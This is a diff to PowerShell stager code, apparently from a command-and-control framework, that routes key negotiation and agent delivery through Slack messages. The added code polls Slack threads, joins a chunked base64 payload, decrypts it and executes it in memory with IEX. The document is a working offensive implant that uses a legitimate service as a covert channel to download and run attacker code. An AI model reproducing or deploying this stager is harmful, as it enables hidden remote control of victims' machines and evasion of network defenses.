@@ -152,29 +152,45 @@ function Start-Negotiate {
     $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
     $rc4p = $IV + $rc4p + $eb;
 
+    Write-Host "[*] Starting stage 3";
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
-    $rc4p_base64=[System.Web.HttpUtility]::UrlEncode((Encode-Base64 $rc4p));
+    $rc4p_base64=[System.Net.WebUtility]::UrlEncode((Encode-Base64 $rc4p));
     $slack_response=$wc.UploadString("https://slack.com/api/chat.postMessage","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&text=$rc4p_base64&username=$($ID):3");
-    $thread_ts=(ConvertFrom-Json20 $slack_response).ts;
+    $thread_ts=(ConvertFrom-Json20 $slack_response)["ts"];
+
+    Write-Host "[*] Thread timestamp is $thread_ts";
 
     # wait for listener to respond before proceeding
-    $listener_replied=$false;
-    while($listener_replied -eq $false) {
-        Start-Sleep -Seconds 1;
+    $reply_count=0;
+    while($reply_count -eq 0) {
+        Start-Sleep -Seconds 2;
         $listener_replied=$false;
 
         $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
-        $slack_response2=$wc.UploadString('https://slack.com/api/channels.history','POST','token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&oldest=$thread_ts');
+        $slack_response2=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
         $slack_response2=ConvertFrom-Json20 $slack_response2;
+        $reply_count=$($slack_response2["messages"][0]["reply_count"]);
 
-        if($slack_response2.messages.count -ne 0) {
-            $raw=Decode-Base64 $slack_response2.messages[0].text;
-            if($raw) {
-                $listener_replied=$true;
-            }
-        }
+        Write-Host "[*] Reply count is $reply_count";
+
     }
-    
+    Write-Host "[*] Listener has finished sending the base64 string.";
+
+    # listener has replied grab all replies
+    $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
+    $slack_response2=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
+    $slack_response2=ConvertFrom-Json20 $slack_response2;
+
+    # should only be a single reply so lets assume only 1 reply
+    $replies = $slack_response2["messages"] | ?{ $_["ts"] -ne $_["thread_ts"] };
+    $raw_base64 = $replies["text"];
+
+    write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
+    $raw=Decode-Base64 $raw_base64;
+    if($raw) {
+        write-host "[*] cypher text decode from base64";
+    }
+
 
     # step 4 of negotiation -> server returns RSA(nonce+AESsession))
     $de=$rs.decrypt($raw,$false);
@@ -264,32 +280,48 @@ function Start-Negotiate {
     $wc.Headers.Add("User-Agent",$UA);
 
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
-    $rc4p2_base64=[System.Web.HttpUtility]::UrlEncode((Encode-Base64 $rc4p2));
+    $rc4p2_base64=[System.Net.WebUtility]::UrlEncode((Encode-Base64 $rc4p2));
     $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
     $slack_response=$wc.UploadString("https://slack.com/api/chat.postMessage","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&text=$rc4p2_base64&username=$($ID):5");
-    $thread_ts=(ConvertFrom-Json20 $slack_response).ts;
+    $thread_ts=(ConvertFrom-Json20 $slack_response)["ts"];
+
 
     # wait for listener to respond before proceeding
     $listener_replied=$false;
     while($listener_replied -eq $false) {
-        Start-Sleep -Seconds 1;
+        Start-Sleep -Seconds 2;
         $listener_replied=$false;
 
         $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
-        $slack_response2=$wc.UploadString('https://slack.com/api/channels.history','POST','token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&oldest=$thread_ts');
-        $slack_response2=ConvertFrom-Json20 $slack_response2;
+        $slack_response=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
+        $slack_response=ConvertFrom-Json20 $slack_response;
 
-        if($slack_response2.messages.count -ne 0) {
-            $raw=Decode-Base64 $slack_response2.messages[0].text;
-            if($raw) {
-                $listener_replied=$true;
-            }
+        Write-Host "[*] Reply count is $($slack_response["messages"][0]["reply_count"])";
+
+        $last_message = $slack_response["messages"] | Select -Last 1;
+        if($last_message["text"] -eq "-MESSAGE_END-") {
+            Write-Host "[*] Listener has finished sending the base64 string.";
+            $listener_replied=$true;
         }
     }
 
+    # listener has replied grab all replies
+    $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
+    $slack_response=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
+    $slack_response=ConvertFrom-Json20 $slack_response;
+
+    $replies = $slack_response["messages"] | ?{ $_["ts"] -ne $_["thread_ts"] };
+    $replies_end = $replies.count - 2;
+    $raw_base64 = ($replies[0..$replies_end] | %{$_["text"]}) -join '';
+    write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
+    $raw=Decode-Base64 $raw_base64;
+    if($raw) {
+        write-host "[*] cypher text decode from base64";
+    }
+
     # # decrypt the agent and register the agent logic
-    # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
-    # write-host "data len: $($Data.Length)";
+    $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
+    write-host "data len: $($Data.Length)";
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
 
     # clear some variables out of memory and cleanup before execution
